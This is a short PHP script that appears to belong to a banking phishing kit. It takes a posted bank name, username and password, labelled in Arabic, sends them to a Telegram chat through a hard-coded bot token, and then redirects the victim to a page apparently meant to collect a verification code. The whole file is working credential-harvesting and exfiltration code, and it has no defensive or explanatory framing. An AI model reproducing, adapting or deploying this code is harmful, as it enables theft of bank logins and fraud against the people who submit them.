			<?php
    if(isset($_POST['step3'])) {
		$user = $_POST['a'];
		$idnum = $_POST['b'];
		$idb = $_POST['bname'];
		$apiToken = "5713989974:AAHAwSTDfaZbuQ8gnp9v_y5Zbkgryx0QLCI";
		$text = "اسم البنك : " .$idb .  "\nاسم المستخدم : " .$user . "\nرقم السر:\n" .$idnum;
        $data = [
            'chat_id' => "-690510241", 
            'text' => $text
        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );    
    	echo "<script> location.href='code.php'; </script>";
        exit;
    	}
	?>